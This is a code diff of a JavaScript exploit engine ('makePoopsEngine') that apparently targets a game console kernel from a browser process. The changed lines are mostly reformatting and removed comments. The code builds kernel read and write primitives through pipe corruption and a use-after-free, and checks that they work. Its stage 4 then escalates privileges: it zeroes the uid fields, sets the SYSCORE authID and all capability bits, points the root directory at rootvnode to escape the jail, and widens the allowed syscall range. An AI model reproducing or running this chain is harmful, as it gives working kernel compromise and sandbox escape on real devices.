     if (!a1.ok) {
       out.why = "fdescenttbl read failed";
       return false;
     }
     const fdescenttbl = a1.value;
-
     S.fdOfiles = fdescenttbl.add32(PK.OFF.FDESCENTTBL_HDR);
-
     const maxFd = Math.max(S.masterRfd, S.victimRfd);
     const nf = await kslowRead(
       fdescenttbl,
@@ -5498,7 +5360,7 @@ export function makePoopsEngine(X) {
         return true;
       },
       "stage2:fdt_nfiles",
-      { repairDeadlineMs: 20000 },
+      { repairDeadlineMs: 20000 }
     );
     if (nf.ok) {
       S.nfiles = nf.value.low;
@@ -5510,104 +5372,68 @@ export function makePoopsEngine(X) {
     } else {
       note("fdt_nfiles read failed (" + nf.log.join(" | ") + ")");
     }
-
     await TW.repairTriplets({ deadlineMs: 20000 });
     await sleepK(PK.STAGE2_SLEEP_MS);
     await TW.repairTriplets({ deadlineMs: 20000 });
-
-    const a2 = await step(
-      "master_fp",
-      S.fdOfiles.add32(S.masterRfd * PK.OFF.FILEDESCENT_SIZE),
-    );
+    const a2 = await step("master_fp",
+      S.fdOfiles.add32(S.masterRfd * PK.OFF.FILEDESCENT_SIZE));
     if (!a2.ok) {
       out.why = "master_fp read failed";
       return false;
     }
     S.masterFp = a2.value;
-
     await TW.repairTriplets({ deadlineMs: 20000 });
     await sleepK(PK.STAGE2_SLEEP_MS);
     await TW.repairTriplets({ deadlineMs: 20000 });
-
-    const a3 = await step(
-      "victim_fp",
-      S.fdOfiles.add32(S.victimRfd * PK.OFF.FILEDESCENT_SIZE),
-    );
+    const a3 = await step("victim_fp",
+      S.fdOfiles.add32(S.victimRfd * PK.OFF.FILEDESCENT_SIZE));
     if (!a3.ok) {
       out.why = "victim_fp read failed";
       return false;
     }
     S.victimFp = a3.value;
-
     if (S.masterFp.low === S.victimFp.low && S.masterFp.hi === S.victimFp.hi) {
-      out.why =
-        "master_fp === victim_fp (" +
-        hx(S.masterFp) +
-        "), filedescent size 0x" +
-        PK.OFF.FILEDESCENT_SIZE.toString(16) +
-        " or fd_ofiles wrong for 5.50";
+      out.why = "master_fp === victim_fp (" + hx(S.masterFp)
+        + "), filedescent size 0x" + PK.OFF.FILEDESCENT_SIZE.toString(16)
+        + " or fd_ofiles wrong for the active firmware profile";
       return false;
     }
-
     await TW.repairTriplets({ deadlineMs: 20000 });
     await sleepK(PK.STAGE2_SLEEP_MS);
     await TW.repairTriplets({ deadlineMs: 20000 });
-
-    const a4 = await step(
-      "master_pipe_data",
-      S.masterFp.add32(PK.OFF.FILE_F_DATA),
-    );
+    const a4 = await step("master_pipe_data",
+      S.masterFp.add32(PK.OFF.FILE_F_DATA));
     if (!a4.ok) {
       out.why = "master_pipe_data read failed";
       return false;
     }
     S.masterPipeData = a4.value;
-
     await TW.repairTriplets({ deadlineMs: 20000 });
     await sleepK(PK.STAGE2_SLEEP_MS);
     await TW.repairTriplets({ deadlineMs: 20000 });
-
-    const a5 = await step(
-      "victim_pipe_data",
-      S.victimFp.add32(PK.OFF.FILE_F_DATA),
-    );
+    const a5 = await step("victim_pipe_data",
+      S.victimFp.add32(PK.OFF.FILE_F_DATA));
     if (!a5.ok) {
       out.why = "victim_pipe_data read failed";
       return false;
     }
     S.victimPipeData = a5.value;
-
-    if (
-      S.masterPipeData.low === S.victimPipeData.low &&
-      S.masterPipeData.hi === S.victimPipeData.hi
-    ) {
-      out.why =
-        "master_pipe == victim_pipe (" +
-        hx(S.masterPipeData) +
-        ") -- aliased, bad leak";
+    if (S.masterPipeData.low === S.victimPipeData.low
+      && S.masterPipeData.hi === S.victimPipeData.hi) {
+      out.why = "master_pipe == victim_pipe (" + hx(S.masterPipeData)
+        + ") -- aliased, bad leak";
       return false;
     }
-
     out.recheckOk = false;
-    const a6 = await step(
-      "fdescenttbl-recheck",
-      S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
-    );
+    const a6 = await step("fdescenttbl-recheck",
+      S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES));
     if (!a6.ok) {
-      note(
-        "fdescenttbl re-read failed, single unrepeated read of the " +
-          "fd table base",
-      );
-    } else if (
-      a6.value.low !== fdescenttbl.low ||
-      a6.value.hi !== fdescenttbl.hi
-    ) {
-      out.why =
-        "fdescenttbl changed between first and last read (" +
-        hx(fdescenttbl) +
-        " -> " +
-        hx(a6.value) +
-        ")";
+      note("fdescenttbl re-read failed, single unrepeated read of the "
+        + "fd table base");
+    } else if (a6.value.low !== fdescenttbl.low
+      || a6.value.hi !== fdescenttbl.hi) {
+      out.why = "fdescenttbl changed between first and last read ("
+        + hx(fdescenttbl) + " -> " + hx(a6.value) + ")";
       return false;
     } else {
       out.recheckOk = true;
@@ -6440,11 +6266,11 @@ export function makePoopsEngine(X) {
       rep.leftOpen.push(why + " fd=" + fd);
     };
 
-    // Once kernel R/W has been exercised, waking the parked uioW racers during
-    // teardown is unsafe on 9.00.  A live run reached TERM-PRE-uioW and then the
-    // kernel panicked with "free of already freed object (Files)" before the
-    // signal completed.  Preserve the WebProcess state intact and require a
-    // reboot instead of attempting another file-reference transition.
+
+
+
+
+
     if (S.kernelWrites !== 0 || S.jailbroken) {
       const parkedGroups = [S.iovGroup, S.uioReadGroup, S.uioWriteGroup]
         .filter((g) => g && g.spawned && g.spawned.length)
@@ -7028,14 +6854,14 @@ export function makePoopsEngine(X) {
         " rounds: no writev " +
         "uio in the freed chunk";
       forceSettled(S.uioWriteGroup, "kwriteA-exhausted");
-      await releaseUioAndSettle("kwriteA-exhausted", size);
+      await releaseUioWriteAndSettle("kwriteA-exhausted", size);
       return out;
     }
 
     const leaked = r64(b.readback.u8, PK.OFF.UIO_IOV);
     if (isZero64(leaked) || !isKernelPtr(leaked)) {
       out.why = "kwrite leaked_iov " + hx(leaked) + " is not canonical";
-      await releaseUioAndSettle("kwriteA-bad-iov", size);
+      await releaseUioWriteAndSettle("kwriteA-bad-iov", size);
       return out;
     }
 
@@ -7050,7 +6876,7 @@ export function makePoopsEngine(X) {
         hx(leaked) +
         ", refusing to write";
       flushMark("KWRITE-IOV-CHANGED", out.why.slice(0, 150));
-      await releaseUioAndSettle("kwrite-iov-changed", size);
+      await releaseUioWriteAndSettle("kwrite-iov-changed", size);
       return out;
     }
 
@@ -7100,7 +6926,7 @@ export function makePoopsEngine(X) {
         "uio never landed (outLen/segflg as kread)";
       forceSettled(S.iovGroup, "kwriteB-exhausted");
       await releaseIovAndSettle("kwriteB-exhausted");
-      await releaseUioAndSettle("kwriteB-exhausted", size);
+      await releaseUioWriteAndSettle("kwriteB-exhausted", size);
       return out;
     }
 
@@ -7210,12 +7036,14 @@ export function makePoopsEngine(X) {
   }
 
   async function fholdFast(fp) {
-    const before = await kread32Fast(fp.add32(PK.OFF.FILE_F_COUNT));
+    const countAddr = fp.add32(PK.OFF.FILE_F_COUNT);
+    const before = await kread32Fast(countAddr);
     if (before.ret !== 4) return { ok: false, why: "f_count read short" };
-    await kwrite32Fast(fp.add32(PK.OFF.FILE_F_COUNT), (before.v + 1) >>> 0);
-    const after = await kread32Fast(fp.add32(PK.OFF.FILE_F_COUNT));
+    const next = (before.v + 1) >>> 0;
+    await kwrite32Fast(countAddr, next);
+    const after = await kread32Fast(countAddr);
     return {
-      ok: after.v === (before.v + 1) >>> 0,
+      ok: after.v === next,
       before: before.v,
       after: after.v,
     };
@@ -7337,20 +7165,17 @@ export function makePoopsEngine(X) {
     flushMark("UAF-FILE", "uaf_sock=" + S.uafSock + "-fp=" + hx(uafFp.v));
     if (!isKernelPtr(uafFp.v))
       return { ok: false, why: "uaf fp=" + hx(uafFp.v) };
+    const zero = i64(0, 0);
     await kwrite64Fast(
-      S.fdOfiles.add32(S.uafSock * PK.OFF.FILEDESCENT_SIZE),
-      i64(0, 0),
+      S.fdOfiles.add32(S.uafSock * PK.OFF.FILEDESCENT_SIZE), zero
     );
 
-    let removed = 0,
-      scanned = 0;
-    const uafDeadline = Date.now() + 15000;
+    let removed = 0, scanned = 0;
+    const deadline = Date.now() + 15000;
     for (let i = 0; i < 0x400 && removed < 3; ++i) {
-      if (Date.now() > uafDeadline) {
-        queueEvent(
-          "UAF-FILE-DEADLINE",
-          "scanned=" + scanned + "-removed=" + removed + "-of-3",
-        );
+      if (Date.now() > deadline) {
+        queueEvent("UAF-FILE-DEADLINE", "scanned=" + scanned
+          + "-removed=" + removed + "-of-3");
         break;
       }
       scanned++;
@@ -7360,8 +7185,7 @@ export function makePoopsEngine(X) {
       const fp = await fgetFast(s);
       if (fp.v.low === uafFp.v.low && fp.v.hi === uafFp.v.hi) {
         await kwrite64Fast(
-          S.fdOfiles.add32(s * PK.OFF.FILEDESCENT_SIZE),
-          i64(0, 0),
+          S.fdOfiles.add32(s * PK.OFF.FILEDESCENT_SIZE), zero
         );
         removed++;
       }
@@ -7381,18 +7205,11 @@ export function makePoopsEngine(X) {
   }
 
   async function stage3Body(opts) {
-    const o = opts || {};
-    const b = S.buf;
+    const o = opts || {}, b = S.buf;
     const out = {
-      ok: false,
-      why: "",
-      steps: [],
-      rw: false,
-      readTest: null,
-      writeTest: null,
-      cleanup: {},
+      ok: false, why: "", steps: [], rw: false, readTest: null,
+      writeTest: null, cleanup: {}
     };
-
     if (!S.masterPipeData || !S.victimPipeData) {
       out.why = "stage 3 needs stage 2's pipe pointers";
       return out;
@@ -7402,11 +7219,10 @@ export function makePoopsEngine(X) {
       return out;
     }
     if (!TW.tripletsValid()) {
-      out.why =
-        "stage 3 needs three live aliases; triplets=" + TW.S.triplets.join(",");
+      out.why = "stage 3 needs three live aliases; triplets="
+        + TW.S.triplets.join(",");
       return out;
     }
-
     const pb = b.pipebuf.u8;
     w32(pb, 0x00, 0);
     w32(pb, 0x04, 0);
@@ -7415,46 +7231,31 @@ export function makePoopsEngine(X) {
     w64(pb, 0x10, S.victimPipeData);
     flushMark(
       "STAGE3-CORRUPT-PRE",
-      "master_pipe=" +
-        hx(S.masterPipeData) +
-        "-victim_pipe=" +
-        hx(S.victimPipeData) +
-        "-size=0x" +
-        PK.PIPE_PAGE_SIZE.toString(16),
+      "master_pipe=" + hx(S.masterPipeData) + "-victim_pipe="
+        + hx(S.victimPipeData) + "-size=0x"
+        + PK.PIPE_PAGE_SIZE.toString(16)
     );
     flushQueueSoft();
-
     const kw = await kwriteSlow(S.masterPipeData, pb, PK.PIPEBUF_SIZE, o);
-    out.steps.push(
-      "kwrite_slow(master_pipe_data)=" + (kw.ok ? "ok" : "FAILED: " + kw.why),
-    );
+    out.steps.push("kwrite_slow(master_pipe_data)="
+      + (kw.ok ? "ok" : "FAILED: " + kw.why));
     if (!kw.ok) {
       out.why = "pipebuf write failed: " + kw.why;
       return out;
     }
-
-    let verified = false,
-      sawv = null;
+    let verified = false, sawv = null;
     for (let i = 0; i < 3 && !verified; ++i) {
       const v = await kread64Fast(S.masterPipeData.add32(0x10));
       sawv = v.v;
-      verified =
-        v.v.low === S.victimPipeData.low && v.v.hi === S.victimPipeData.hi;
+      verified = v.v.low === S.victimPipeData.low
+        && v.v.hi === S.victimPipeData.hi;
     }
-    out.steps.push(
-      "verify master_pipe+0x10=" +
-        hx(sawv) +
-        (verified
-          ? " == victim_pipe"
-          : " != victim_pipe " + hx(S.victimPipeData)),
-    );
+    out.steps.push("verify master_pipe+0x10=" + hx(sawv)
+      + (verified ? " == victim_pipe"
+        : " != victim_pipe " + hx(S.victimPipeData)));
     if (!verified) {
-      out.why =
-        "master_pipe+0x10 reads " +
-        hx(sawv) +
-        ", expected " +
-        hx(S.victimPipeData) +
-        "; fast primitive not live";
+      out.why = "master_pipe+0x10 reads " + hx(sawv) + ", expected "
+        + hx(S.victimPipeData) + "; fast primitive not live";
       flushMark("STAGE3-VERIFY-FAILED", out.why.slice(0, 150));
       return out;
     }
@@ -7463,89 +7264,48 @@ export function makePoopsEngine(X) {
 
     const fpAddr = S.fdOfiles.add32(S.masterRfd * PK.OFF.FILEDESCENT_SIZE);
     const fastFp = await kread64Fast(fpAddr);
-    const crossOk =
-      fastFp.ret === 8 &&
-      fastFp.v.low === S.masterFp.low &&
-      fastFp.v.hi === S.masterFp.hi;
+    const crossOk = fastFp.ret === 8 && fastFp.v.low === S.masterFp.low
+      && fastFp.v.hi === S.masterFp.hi;
     out.readTest = {
       cross: {
-        addr: hx(fpAddr),
-        fast: hx(fastFp.v),
-        slow: hx(S.masterFp),
-        pass: crossOk,
-      },
+        addr: hx(fpAddr), fast: hx(fastFp.v), slow: hx(S.masterFp),
+        pass: crossOk
+      }
     };
-    out.steps.push(
-      "read test A (cross-primitive) " +
-        hx(fpAddr) +
-        ": fast=" +
-        hx(fastFp.v) +
-        " slow=" +
-        hx(S.masterFp) +
-        (crossOk ? " AGREE" : " DISAGREE"),
-    );
+    out.steps.push("read test A (cross-primitive) " + hx(fpAddr)
+      + ": fast=" + hx(fastFp.v) + " slow=" + hx(S.masterFp)
+      + (crossOk ? " AGREE" : " DISAGREE"));
     flushMark(
       "STAGE3-READTEST-CROSS",
-      "addr=" +
-        hx(fpAddr) +
-        "-fast=" +
-        hx(fastFp.v) +
-        "-slow=" +
-        hx(S.masterFp) +
-        "-pass=" +
-        crossOk,
+      "addr=" + hx(fpAddr) + "-fast=" + hx(fastFp.v) + "-slow="
+        + hx(S.masterFp) + "-pass=" + crossOk
     );
     if (!crossOk) {
-      out.why =
-        "read test failed: fast reads " +
-        hx(fastFp.v) +
-        " at " +
-        hx(fpAddr) +
-        ", kread_slow read " +
-        hx(S.masterFp);
+      out.why = "read test failed: fast reads " + hx(fastFp.v) + " at "
+        + hx(fpAddr) + ", kread_slow read " + hx(S.masterFp);
       return out;
     }
-
     const cp = await findCurproc();
     if (cp.ok) {
       S.curproc = cp.curproc;
       const kpid = await kread32Fast(cp.curproc.add32(PK.OFF.PROC_PID));
       const pidOk = kpid.v === cp.pid;
       out.readTest.pid = {
-        curproc: hx(cp.curproc),
-        kernelPid: kpid.v,
-        userlandPid: cp.pid,
-        pass: pidOk,
+        curproc: hx(cp.curproc), kernelPid: kpid.v, userlandPid: cp.pid,
+        pass: pidOk
       };
-      out.steps.push(
-        "read test B (pid) curproc=" +
-          hx(cp.curproc) +
-          " p_pid=" +
-          kpid.v +
-          " getpid()=" +
-          cp.pid +
-          (pidOk ? " MATCH" : " MISMATCH"),
-      );
+      out.steps.push("read test B (pid) curproc=" + hx(cp.curproc)
+        + " p_pid=" + kpid.v + " getpid()=" + cp.pid
+        + (pidOk ? " MATCH" : " MISMATCH"));
       flushMark(
         "STAGE3-READTEST-PID",
-        "curproc=" +
-          hx(cp.curproc) +
-          "-p_pid=" +
-          kpid.v +
-          "-getpid=" +
-          cp.pid +
-          "-pass=" +
-          pidOk,
+        "curproc=" + hx(cp.curproc) + "-p_pid=" + kpid.v + "-getpid="
+          + cp.pid + "-pass=" + pidOk
       );
       if (!pidOk) {
-        out.why =
-          "read test B failed: curproc->p_pid reads " +
-          kpid.v +
-          " but getpid() says " +
-          cp.pid +
-          "; suspect +0x" +
-          PK.OFF.PROC_PID.toString(16) +
-          " or the sigio walk";
+        out.why = "read test B failed: curproc->p_pid reads " + kpid.v
+          + " but getpid() says " + cp.pid + "; suspect +0x"
+          + PK.OFF.PROC_PID.toString(16) + " or the sigio walk";
         return out;
       }
     } else {
@@ -7553,7 +7313,6 @@ export function makePoopsEngine(X) {
       out.steps.push("pid read test skipped: " + cp.why + " (test A passed)");
       flushMark("STAGE3-READTEST-PID-SKIP", cp.why.slice(0, 140));
     }
-
     const fps = [];
     for (const fd of [S.masterRfd, S.masterWfd, S.victimRfd, S.victimWfd]) {
       const fp = await fgetFast(fd);
@@ -7565,69 +7324,35 @@ export function makePoopsEngine(X) {
     }
     const h0 = await fholdFast(fps[0].fp);
     out.writeTest = {
-      fd: fps[0].fd,
-      fp: hx(fps[0].fp),
-      before: h0.before,
-      after: h0.after,
-      pass: !!h0.ok,
+      fd: fps[0].fd, fp: hx(fps[0].fp), before: h0.before,
+      after: h0.after, pass: !!h0.ok
     };
-    out.steps.push(
-      "write test f_count(fd " +
-        fps[0].fd +
-        ") " +
-        h0.before +
-        " -> " +
-        h0.after +
-        (h0.ok ? " MATCH" : " MISMATCH"),
-    );
+    out.steps.push("write test f_count(fd " + fps[0].fd + ") "
+      + h0.before + " -> " + h0.after + (h0.ok ? " MATCH" : " MISMATCH"));
     flushMark(
       "STAGE3-WRITETEST",
-      "fd=" +
-        fps[0].fd +
-        "-fp=" +
-        hx(fps[0].fp) +
-        "-before=" +
-        h0.before +
-        "-after=" +
-        h0.after +
-        "-pass=" +
-        h0.ok,
+      "fd=" + fps[0].fd + "-fp=" + hx(fps[0].fp) + "-before="
+        + h0.before + "-after=" + h0.after + "-pass=" + h0.ok
     );
     if (!h0.ok) {
-      out.why =
-        "write test failed: f_count " +
-        h0.before +
-        " -> " +
-        h0.after +
-        ", expected " +
-        ((h0.before + 1) >>> 0) +
-        "; writes not landing";
+      out.why = "write test failed: f_count " + h0.before + " -> " + h0.after
+        + ", expected " + ((h0.before + 1) >>> 0) + "; writes not landing";
       return out;
     }
     for (let i = 1; i < fps.length; ++i) await fholdFast(fps[i].fp);
     out.steps.push("fhold: 4/4 pipe files held");
-
     const rr = [];
     for (let s = 0; s < 3; ++s) {
       const r = await removeRthrFromSocket(TW.S.triplets[s]);
       rr.push(r.ok);
-      out.steps.push(
-        "remove_rthr(triplets[" +
-          s +
-          "]=" +
-          TW.S.triplets[s] +
-          ")=" +
-          (r.ok ? "ok" : "FAILED: " + r.why),
-      );
+      out.steps.push("remove_rthr(triplets[" + s + "]=" + TW.S.triplets[s]
+        + ")=" + (r.ok ? "ok" : "FAILED: " + r.why));
     }
     out.cleanup.rthdrCleared = rr.filter(Boolean).length;
-
     if (out.cleanup.rthdrCleared === 3) {
-      TW.clearCorrupt(
-        "three ip6po_rthdr pointers zeroed; " + "no socket aliases the chunk",
-      );
+      TW.clearCorrupt("three ip6po_rthdr pointers zeroed; "
+        + "no socket aliases the chunk");
     }
-
     let burnedFixed = 0;
     for (const idx of TW.S.burned.slice()) {
       const r = await removeRthrFromSocket(idx);
@@ -7635,40 +7360,29 @@ export function makePoopsEngine(X) {
     }
     out.cleanup.burnedCleared = burnedFixed;
     out.cleanup.burnedTotal = TW.S.burned.length;
-
-    if (out.cleanup.rthdrCleared === 3 && burnedFixed === TW.S.burned.length) {
+    const aliasesRepaired = out.cleanup.rthdrCleared === 3
+      && burnedFixed === TW.S.burned.length;
+    if (aliasesRepaired) {
       S.aliasesRepaired = true;
       flushMark(
         "ALIASES-REPAIRED",
-        "triplet=3-burned=" + burnedFixed + "-of-" + TW.S.burned.length,
+        "triplet=3-burned=" + burnedFixed + "-of-" + TW.S.burned.length
       );
     }
-    if (TW.S.burned.length)
-      out.steps.push(
-        "remove_rthr on " +
-          burnedFixed +
-          "/" +
-          TW.S.burned.length +
-          " burned socket(s)",
-      );
-
+    if (TW.S.burned.length) {
+      out.steps.push("remove_rthr on " + burnedFixed + "/"
+        + TW.S.burned.length + " burned socket(s)");
+    }
     const uf = await removeUafFile();
     out.cleanup.uafRemoved = uf.ok ? uf.removed : -1;
-    out.steps.push(
-      "remove_uaf_file=" +
-        (uf.ok ? uf.removed + " slot(s)" : "FAILED: " + uf.why),
-    );
-
+    out.steps.push("remove_uaf_file="
+      + (uf.ok ? uf.removed + " slot(s)" : "FAILED: " + uf.why));
     out.ok = true;
     flushMark(
       "STAGE3-DONE",
-      "rw=1-readTest=pass-writeTest=pass" +
-        "-rthdrCleared=" +
-        out.cleanup.rthdrCleared +
-        "-uafRemoved=" +
-        out.cleanup.uafRemoved +
-        "-kernelWrites=" +
-        S.kernelWrites,
+      "rw=1-readTest=pass-writeTest=pass-rthdrCleared="
+        + out.cleanup.rthdrCleared + "-uafRemoved=" + out.cleanup.uafRemoved
+        + "-kernelWrites=" + S.kernelWrites
     );
     return out;
   }
@@ -7803,86 +7517,49 @@ export function makePoopsEngine(X) {
   }
 
   async function stage4Body(opts) {
-    const out = {
-      ok: false,
-      why: "",
-      steps: [],
-      escaped: false,
-      before: {},
-      after: {},
-    };
+    const out = { ok: false, why: "", steps: [], escaped: false, before: {}, after: {}, };
 
     if (!S.aliasesRepaired) {
-      out.why = "stage 3 repair not certified";
-      return out;
+      out.why = "stage 3 repair not certified"; return out;
     }
     if (!S.curproc || !isKernelPtr(S.curproc)) {
-      out.why = "stage 4 needs curproc; have " + hx(S.curproc);
-      return out;
+      out.why = "stage 4 needs curproc; have " + hx(S.curproc); return out;
     }
 
     const fdR = await kread64Fast(S.curproc.add32(PK.OFF.PROC_FD));
     if (fdR.ret !== 8 || !isKernelPtr(fdR.v)) {
-      out.why = "curproc->p_fd = " + hx(fdR.v);
-      return out;
+      out.why = "curproc->p_fd = " + hx(fdR.v); return out;
     }
     const procFd = fdR.v;
     const ucR = await kread64Fast(S.curproc.add32(PK.OFF.PROC_UCRED));
     if (ucR.ret !== 8 || !isKernelPtr(ucR.v)) {
-      out.why = "curproc->p_ucred = " + hx(ucR.v);
-      return out;
+      out.why = "curproc->p_ucred = " + hx(ucR.v); return out;
     }
     const ucred = ucR.v;
-    out.steps.push(
-      "curproc=" +
-        hx(S.curproc) +
-        " p_fd=" +
-        hx(procFd) +
-        " p_ucred=" +
-        hx(ucred),
-    );
+    out.steps.push("curproc=" + hx(S.curproc) + " p_fd=" + hx(procFd)
+      + " p_ucred=" + hx(ucred));
 
     const rv = await findRootvnode();
     if (!rv.ok) {
-      out.why = "rootvnode: " + rv.why;
-      return out;
+      out.why = "rootvnode: " + rv.why; return out;
     }
-    out.steps.push(
-      "init=" +
-        hx(rv.init) +
-        " init_fd=" +
-        hx(rv.initFd) +
-        " rootvnode=" +
-        hx(rv.rootvnode),
-    );
+    out.steps.push("init=" + hx(rv.init) + " init_fd=" + hx(rv.initFd)
+      + " rootvnode=" + hx(rv.rootvnode));
 
     const uid0 = await kread32Fast(ucred.add32(PK.OFF.UCRED_CR_UID));
     if (uid0.ret !== 4) {
-      out.why = "cannot read cr_uid";
-      return out;
+      out.why = "cannot read cr_uid"; return out;
     }
     out.before.uid = uid0.v;
     const attrs0 = await kread64Fast(ucred.add32(PK.OFF.UCRED_ATTRS_QWORD));
     if (attrs0.ret !== 8) {
-      out.why = "cannot read cr_sceAttrs";
-      return out;
+      out.why = "cannot read cr_sceAttrs"; return out;
     }
     out.steps.push("before: cr_uid=" + uid0.v + " attrs_qword=" + hx(attrs0.v));
 
-    flushMark(
-      "STAGE4-PRE",
-      "curproc=" +
-        hx(S.curproc) +
-        "-ucred=" +
-        hx(ucred) +
-        "-p_fd=" +
-        hx(procFd) +
-        "-rootvnode=" +
-        hx(rv.rootvnode) +
-        "-uid=" +
-        uid0.v +
-        "-writes=begin",
-    );
+    flushMark("STAGE4-PRE", "curproc=" + hx(S.curproc) + "-ucred=" + hx(ucred)
+      + "-p_fd=" + hx(procFd) + "-rootvnode=" + hx(rv.rootvnode)
+      + "-uid=" + uid0.v + "-writes=begin");
 
     await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_UID), 0);
     await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_RUID), 0);
@@ -7892,135 +7569,69 @@ export function makePoopsEngine(X) {
     await kwrite32Fast(ucred.add32(PK.OFF.UCRED_CR_SVGID), 0);
     out.steps.push("cr_uid/ruid/svuid=0, ngroups=1, rgid/svgid=0");
 
-    const attrs = i64(
-      ((attrs0.v.low & 0x00ffffff) >>> 0) | 0x80000000,
-      attrs0.v.hi,
-    );
+    const attrs = i64(((attrs0.v.low & 0x00ffffff) >>> 0) | 0x80000000,
+      attrs0.v.hi,);
     await kwrite64Fast(ucred.add32(PK.OFF.UCRED_ATTRS_QWORD), attrs);
     out.steps.push("cr_sceAttrs byte=0x80 (RMW)");
 
-    await kwrite64Fast(
-      ucred.add32(PK.OFF.UCRED_CR_SCEAUTHID),
-      i64(PK.SYSCORE_AUTHID_LO, PK.SYSCORE_AUTHID_HI),
-    );
-    await kwrite64Fast(
-      ucred.add32(PK.OFF.UCRED_CR_SCECAPS0),
-      i64(0xffffffff, 0xffffffff),
-    );
-    await kwrite64Fast(
-      ucred.add32(PK.OFF.UCRED_CR_SCECAPS1),
-      i64(0xffffffff, 0xffffffff),
-    );
-    out.steps.push(
-      "cr_sceAuthID=0x" +
-        PK.SYSCORE_AUTHID_HI.toString(16) +
-        PK.SYSCORE_AUTHID_LO.toString(16).padStart(8, "0") +
-        " (SYSCORE)" +
-        ", cr_sceCaps[0..1]=all",
-    );
+    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_CR_SCEAUTHID),
+      i64(PK.SYSCORE_AUTHID_LO, PK.SYSCORE_AUTHID_HI),);
+    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_CR_SCECAPS0),
+      i64(0xffffffff, 0xffffffff),);
+    await kwrite64Fast(ucred.add32(PK.OFF.UCRED_CR_SCECAPS1),
+      i64(0xffffffff, 0xffffffff),);
+    out.steps.push("cr_sceAuthID=0x" + PK.SYSCORE_AUTHID_HI.toString(16)
+      + PK.SYSCORE_AUTHID_LO.toString(16).padStart(8, "0") + " (SYSCORE)"
+      + ", cr_sceCaps[0..1]=all");
 
     await kwrite64Fast(procFd.add32(PK.OFF.FD_CDIR), rv.rootvnode);
     await kwrite64Fast(procFd.add32(PK.OFF.FD_RDIR), rv.rootvnode);
-    // jdir is 0, not rootvnode
     await kwrite64Fast(procFd.add32(PK.OFF.FD_JDIR), i64(0, 0));
-    out.steps.push(
-      "fd_cdir/fd_rdir = rootvnode " + hx(rv.rootvnode) + ", fd_jdir = 0",
-    );
+    out.steps.push("fd_cdir/fd_rdir = rootvnode " + hx(rv.rootvnode) + ", fd_jdir = 0");
     S.kernelWrites += 0;
 
     const dl = await kread64Fast(S.curproc.add32(PK.OFF.PROC_DYNLIB));
     if (dl.ret === 8 && isKernelPtr(dl.v)) {
       await kwrite64Fast(dl.v.add32(PK.OFF.DYNLIB_SC_START), i64(0, 0));
-      await kwrite64Fast(
-        dl.v.add32(PK.OFF.DYNLIB_SC_END),
-        i64(0xffffffff, 0xffffffff),
-      );
-      out.steps.push(
-        "p_dynlib=" + hx(dl.v) + " syscall range widened to everything",
-      );
-      // Do not touch p_dynlib+0x18 here.  On 9.00 it is a pointer to a
-      // module object, not a libkernel reference counter.  Stage 5 no longer
-      // needs dlsym or module/segment widening; it uses exact profile offsets
-      // and the JIT shared-memory syscalls directly.
+      await kwrite64Fast(dl.v.add32(PK.OFF.DYNLIB_SC_END),
+        i64(0xffffffff, 0xffffffff),);
+      out.steps.push("p_dynlib=" + hx(dl.v) + " syscall range widened to everything");
+
       S.dynlibUnrestricted = false;
       S.dlsymEnabled = false;
       out.dlsymEnabled = false;
-      flushMark(
-        "STAGE4-DYNLIB-SAFE",
-        "syscall-range-only=1-module-pointers-untouched=1-dlsym-required=0",
-      );
+      flushMark("STAGE4-DYNLIB-SAFE",
+        "syscall-range-only=1-module-pointers-untouched=1-dlsym-required=0",);
     } else {
-      out.steps.push(
-        "p_dynlib=" +
-          hx(dl.v) +
-          " not canonical; syscall range and dlsym NOT widened",
-      );
+      out.steps.push("p_dynlib=" + hx(dl.v)
+        + " not canonical; syscall range and dlsym NOT widened");
     }
-    flushMark(
-      "STAGE4-DYNLIB",
-      "p_dynlib=" + hx(dl.v) + "-dlsymEnabled=" + !!out.dlsymEnabled,
-    );
+    flushMark("STAGE4-DYNLIB",
+      "p_dynlib=" + hx(dl.v) + "-dlsymEnabled=" + !!out.dlsymEnabled,);
 
     const uid1 = await kread32Fast(ucred.add32(PK.OFF.UCRED_CR_UID));
     const rdir = await kread64Fast(procFd.add32(PK.OFF.FD_RDIR));
     const jdir = await kread64Fast(procFd.add32(PK.OFF.FD_JDIR));
     const auth = await kread64Fast(ucred.add32(PK.OFF.UCRED_CR_SCEAUTHID));
-    out.after = {
-      uid: uid1.v,
-      rdir: hx(rdir.v),
-      jdir: hx(jdir.v),
-      authid: hx(auth.v),
-    };
-    const sameRv = (v) =>
-      v.low === rv.rootvnode.low && v.hi === rv.rootvnode.hi;
+    out.after = { uid: uid1.v, rdir: hx(rdir.v), jdir: hx(jdir.v), authid: hx(auth.v), };
+    const sameRv = (v) => v.low === rv.rootvnode.low && v.hi === rv.rootvnode.hi;
     const uidOk = uid1.v === 0;
-
     const dirOk = sameRv(rdir.v) && isZero64(jdir.v);
-    const authOk =
-      auth.v.low === PK.SYSCORE_AUTHID_LO >>> 0 &&
-      auth.v.hi === PK.SYSCORE_AUTHID_HI >>> 0;
+    const authOk = auth.v.low === PK.SYSCORE_AUTHID_LO >>> 0
+      && auth.v.hi === PK.SYSCORE_AUTHID_HI >>> 0;
     out.escaped = uidOk && dirOk;
-    out.steps.push(
-      "after: cr_uid=" +
-        uid1.v +
-        " fd_rdir=" +
-        hx(rdir.v) +
-        " fd_jdir=" +
-        hx(jdir.v) +
-        " authid=" +
-        hx(auth.v),
-    );
-    flushMark(
-      "STAGE4-VERIFY",
-      "uid=" +
-        uid1.v +
-        "-uidOk=" +
-        uidOk +
-        "-rdir=" +
-        hx(rdir.v) +
-        "-jdir=" +
-        hx(jdir.v) +
-        "-dirOk=" +
-        dirOk +
-        "-authid=" +
-        hx(auth.v) +
-        "-authOk=" +
-        authOk,
-    );
+    out.steps.push("after: cr_uid=" + uid1.v + " fd_rdir=" + hx(rdir.v)
+      + " fd_jdir=" + hx(jdir.v) + " authid=" + hx(auth.v));
+    flushMark("STAGE4-VERIFY", "uid=" + uid1.v + "-uidOk=" + uidOk
+      + "-rdir=" + hx(rdir.v) + "-jdir=" + hx(jdir.v) + "-dirOk=" + dirOk
+      + "-authid=" + hx(auth.v) + "-authOk=" + authOk,);
 
     if (!uidOk) {
-      out.why = "cr_uid reads " + uid1.v + " after being written 0";
